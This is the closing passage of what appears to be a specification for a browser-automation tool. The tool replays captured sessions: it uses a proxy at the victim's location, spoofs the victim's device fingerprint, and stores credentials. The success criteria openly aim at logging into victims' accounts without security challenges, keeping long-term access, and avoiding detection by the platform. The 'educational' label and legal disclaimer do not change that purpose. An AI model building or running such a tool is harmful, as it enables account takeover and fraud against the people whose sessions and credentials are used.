    parser.add_argument('--mode', 
                       choices=['auto', 'manual'], 
                       default='auto',
                       help='Operation mode: auto (daemon) or manual (select session)')
    
    parser.add_argument('--headless', 
                       action='store_true',
                       help='Run browser in headless mode')
    
    parser.add_argument('--config', 
                       type=str,
                       help='Path to configuration file')
    
    parser.add_argument('--sessions-file', 
                       type=str,
                       help='Path to sessions JSON file')
    
    args = parser.parse_args()
    
    # Update config with command line arguments
    if args.headless:
        CONFIG['HEADLESS_MODE'] = True
    
    if args.sessions_file:
        CONFIG['SESSIONS_FILE'] = args.sessions_file
    
    # Load external config file if provided
    if args.config and os.path.exists(args.config):
        try:
            with open(args.config, 'r') as f:
                external_config = json.load(f)
                CONFIG.update(external_config)
        except Exception as e:
            print(f"[!] Error loading config file: {e}")
    
    print("=" * 60)
    print("Educational Security Research Automation System")
    print("=" * 60)
    print(f"[*] Mode: {args.mode}")
    print(f"[*] Sessions file: {CONFIG['SESSIONS_FILE']}")
    print(f"[*] Headless: {CONFIG['HEADLESS_MODE']}")
    print(f"[*] Auto login: {CONFIG['AUTO_LOGIN']}")
    print("=" * 60)
    
    # Ensure browser data directory exists
    browser_dir = os.path.expanduser(CONFIG['BROWSER_DATA_DIR'])
    os.makedirs(browser_dir, exist_ok=True)
    
    try:
        if args.mode == 'auto':
            await automatic_mode(CONFIG)
        else:
            await manual_mode(CONFIG)
    except KeyboardInterrupt:
        print("\n[+] Educational automation system stopped")
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    asyncio.run(main())
```

## Testing & Validation

### Installation Commands

```bash
# Install required packages
pip install playwright requests watchdog

# Install Playwright browsers
playwright install chromium

# Verify installation
python -c "import playwright; print('Playwright installed successfully')"
```

### Test Data Creation

Create a test `sessions.json` file:

```json
{
  "sessionId": "test-session-123",
  "ip_address": "203.177.129.10",
  "location": {
    "city": "Caloocan City",
    "region": "Metro Manila",
    "country": "Philippines",
    "zipcode": "1409"
  },
  "fingerprint": {
    "browser": {
      "userAgent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36"
    },
    "screen": {
      "width": 1080,
      "height": 2340,
      "devicePixelRatio": 3
    }
  },
  "credentials": [
    {
      "username": "test@example.com",
      "password": "testpass123",
      "attempt": 3
    }
  ]
}
```

### Verification Steps

1. **Proxy Verification**: Visit `https://ipinfo.io/json` to confirm IP matches target location
2. **Fingerprint Verification**: Visit `https://browserleaks.com/canvas` to verify Canvas fingerprint
3. **WebGL Verification**: Visit `https://browserleaks.com/webgl` to verify WebGL fingerprint
4. **Login Verification**: Confirm automatic login succeeds without challenges

### Debug Logging

Enable verbose logging by adding:

```python
import logging
logging.basicConfig(level=logging.DEBUG)
```

## Success Criteria

The automation system is considered successful when:

1. ✅ **Proxy Connection**: Browser exits from victim's exact geographic location
2. ✅ **Fingerprint Match**: All 20 categories pass verification tests
3. ✅ **Login Success**: Automatic login completes without security challenges
4. ✅ **Session Persistence**: Account remains accessible for extended periods
5. ✅ **Dual Mode Operation**: Both automatic and manual modes function correctly
6. ✅ **Error Handling**: Graceful handling of network issues, proxy failures, etc.
7. ✅ **Stealth Operation**: No detection by target platform's security systems

## Legal Compliance

**CRITICAL**: This tool must only be used for:

- Authorized penetration testing
- Red team security assessments  
- Educational security research
- Legitimate security auditing with proper authorization

**Unauthorized use is strictly prohibited and may violate applicable laws.**

---

**This specification provides everything needed to build a complete, production-ready educational security research automation system.**
